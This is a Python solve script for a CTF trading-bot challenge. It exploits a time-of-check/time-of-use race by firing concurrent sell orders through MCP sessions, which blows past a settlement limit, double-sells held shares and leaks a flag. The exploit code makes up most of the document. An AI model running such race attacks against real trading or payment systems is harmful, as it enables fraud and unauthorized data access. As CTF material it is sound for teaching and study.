#!/usr/bin/env python3
"""
TradeBot (KPMG K!Cyber CTF 2026) - full exploit.

Vulnerability
-------------
The settlement engine checks admission ("can this order settle?") *before* it
finishes routing the order and never re-checks it at fill time. Admission allows
at most `max_concurrent_settlements` (19) orders to be settling at once, but
because the check happens at routing start (1.0s) and the fill only happens
~1.0s later (0.8s), N simultaneously-submitted orders all pass the admission
check and then all fill concurrently -> the 19-slot limit is blown.

When >=20 settlements hold a slot at the same time, the engine's "exclusive
vault access" invariant is violated. It detects this, marks the risk engine
`COMPROMISED` / `SETTLEMENT_OVERSUBSCRIPTION`, and "reconciles by returning the
sealed vault record" for that order. The reconciliation is attached to the
order response and leaks the reserve vault seal = the flag.

Strategy
--------
`place_order` requires a positive position for SELL orders, but the position
check is also only done at admission, so the same held shares can be sold many
times concurrently. We therefore buy a small inventory of AAPL once, then fire
>=20 concurrent SELL orders through a barrier so that >=20 fills overlap and the
vault reconciliation is emitted.

Usage:  python3 solve.py            # 22 concurrent sells (recommended)
"""
import json
import re
import sys
import threading
import time

from mcpclient import MCP, extract

SELLS = int(sys.argv[1]) if len(sys.argv) > 1 else 22


def main():
    m = MCP()

    # 1. Make sure we hold enough inventory to pass the (admission-time) sell check.
    pf = json.loads(extract(m.tool("get_portfolio")))
    held = pf.get("positions", {}).get("AAPL", {}).get("shares", 0)
    print(f"[*] balance={pf['balance']}  AAPL={held}")
    if held < SELLS:
        qty = SELLS - held
        print(f"[*] buying {qty} AAPL for inventory ...")
        print("    " + extract(m.tool(
            "place_order", {"symbol": "AAPL", "quantity": qty, "order_type": "buy"},
            timeout=120))[:110])
        time.sleep(1)

    # 2. One MCP session per concurrent order (server tolerates ~24 sessions).
    pool = []
    for _ in range(SELLS):
        for _try in range(6):
            try:
                pool.append(MCP())
                break
            except Exception:
                time.sleep(2)
    n = len(pool)
    print(f"[*] {n} sessions open; firing {n} concurrent SELL orders ...")

    barrier = threading.Barrier(n)
    outs = [None] * n

    def worker(i):
        barrier.wait()  # release every request at the same instant
        try:
            outs[i] = extract(pool[i].tool(
                "place_order",
                {"symbol": "AAPL", "quantity": 1, "order_type": "sell"},
                timeout=90))
        except Exception as e:  # noqa: BLE001
            outs[i] = f"EXC {e}"

    threads = [threading.Thread(target=worker, args=(i,)) for i in range(n)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    # 3. Collect the flag from any oversubscription reconciliation.
    flags = set()
    for o in outs:
        if not o:
            continue
        if "vault_reconciliation" in o:
            print("\n[+] vault reconciliation returned:")
            print("    " + o)
        flags.update(re.findall(r"KPMG_CTF\{[^}]*\}", o))

    print("\n[risk]", extract(m.tool("get_risk_report")))
    if flags:
        print("\n[FLAG]", ",".join(sorted(flags)))
        return 0
    print("\n[-] no leak this run; re-run (the >=20 overlap is probabilistic).")
    return 1


if __name__ == "__main__":
    sys.exit(main())
